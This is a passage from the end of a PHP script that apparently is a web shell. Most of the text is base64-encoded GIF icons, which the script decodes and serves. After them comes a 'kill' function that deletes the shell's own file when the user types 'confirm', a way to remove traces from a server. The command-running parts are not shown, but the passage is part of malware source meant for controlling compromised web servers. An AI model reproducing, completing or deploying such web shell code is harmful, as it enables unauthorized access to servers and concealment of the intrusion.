  "PMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMA" .
  "zDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAA" .
  "Bm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAM+4AAN0AALsAAKoAAIgAAHcA" .
  "AFUAAEQAACIAABEAAADuAADdAAC7AACqAACIAAB3AABVAABEAAAiAAARAAAA7gAA3QAAuwAAqgAAiAAAdwAAVQAARA" .
  "AAIgAAEe7u7t3d3bu7u6qqqoiIiHd3d1VVVURERCIiIhEREQAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMg" .
  "ZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAAkACwAAAAAFA" .
  "AWAAAImQBJCCTBqmDBgQgTDmQFAABDVgojEmzI0KHEhBUrWrwoMGNDihwnAvjHiqRJjhX/qVz5D+VHAFZiWmmZ8BGH" .
  "ji9hxqTJ4ZFAmzc1vpxJgkPPn0Y5CP04M6lPEkCN5mxoJelRqFY5TM36NGrPqV67Op0KM6rYnkup/gMq1mdamC1tdn" .
  "36lijUpwjr0pSoFyUrmTJLhiTBkqXCgAA7",
  "sound"=>"R0lGODlhFAAWAMIAAP////8zM8z//8zMzJmZmWYAADMzMwAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG" .
  "9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAACACwAAAAAFAAW" .
  "AAADayi63P4wNsNCkOocYVWPB7FxFwmFwGh+DZpynndpNAHcW9cVQUj8tttrd+G5hMINT7A0BpE4ZnF6hCqn0iryKs" .
  "0SDN9v0tSc0Q4DQ1SHFRjeBrQ6FzNN5Co2JD4YfUp7GnYsexQLhBiJigsJADs=",
  "script"=>"R0lGODlhFAAWAMIAAP///8z//5mZmTMzMwAAAAAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG" .
  "9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW" .
  "AAADZTi6vPEwDECrnSO+aTvPEddVIrhVBJCSF8QRMIwOBE2fVLrmcYz3O4pgKCDgVMgR0SgZOYVM0dNS/AF7gGy1me" .
  "16v9vXNdYNf89es2os00bRcDW7DVDDwe87fjMg+v9DNxBzYw8JADs=");
  header('Content-type: image/gif');
  echo base64_decode($images[$img]);
  die();
}

function kill(){ // Shell deleter function
  style();
  echo("<form  method='post'>");
  echo("Type 'confirm' to kill the shell:<br>\n<input type='text' name='ver' action='?act=kill'>");
  echo("<input type='submit' value='Delete'>");
  echo("</form>");
  if($_POST['ver'] == "confirm"){
    $self = basename($_SERVER['PHP_SELF']);
    if(unlink($self)){echo("Deleted");}
    else{echo("Failed");}
  }
}
die();
?>
